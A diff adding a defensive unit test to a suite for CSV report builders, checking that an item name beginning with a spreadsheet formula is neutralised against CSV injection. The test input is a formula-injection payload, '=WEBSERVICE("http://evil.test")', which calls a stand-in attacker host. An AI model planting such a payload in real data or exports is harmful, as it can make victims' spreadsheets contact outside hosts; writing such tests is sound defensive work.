@@ -79,6 +79,19 @@ describe('report CSV builders', () => {
     expect(lines[1]).toBe('Idle,4,90,20');
   });
 
+  // Issue #180: report rows carry user-controlled text (item names, hygiene details), so a name
+  // that would open as a spreadsheet formula is neutralised with a leading single quote — RFC-4180
+  // quoting alone does not stop the evaluation.
+  it('neutralises a formula-triggering item name (CSV injection)', () => {
+    const csv = buildDeadStockCsv({
+      sinceDays: 30,
+      lines: [{ id: 'a', name: '=WEBSERVICE("http://evil.test")', quantity: 4, idleDays: 90, value: 20 }],
+      totalValue: 20,
+    });
+    // Prefixed with a single quote and RFC-4180 quoted (the inner quotes are doubled).
+    expect(csv.split('\r\n')[1]).toBe('"\'=WEBSERVICE(""http://evil.test"")",4,90,20');
+  });
+
   // Phase 74 — advanced-analytics CSVs ------------------------------------------
   it('ABC CSV emits one row per ranked line with its tier and cumulative share', () => {
     const csv = buildAbcCsv({
